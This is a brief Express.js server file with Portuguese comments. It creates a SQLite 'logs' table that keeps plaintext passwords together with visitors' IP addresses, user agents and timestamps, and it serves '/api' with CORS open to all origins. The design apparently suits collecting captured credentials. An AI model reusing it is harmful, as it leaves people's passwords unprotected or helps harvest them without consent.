const express = require("express");
const cors = require("cors");
const db = require("./db/connection");
const logRoutes = require("./routes/logs");

const app = express();
const PORT = process.env.PORT || 3000;


app.use(cors());
app.use(express.json());

// Criar tabela
db.run(`
  CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    password TEXT,
    ip TEXT,
    user_agent TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

app.use("/api", logRoutes);

app.listen(PORT, () => {
  console.log(`✅ Backend rodando em http://localhost:${PORT}`);
});
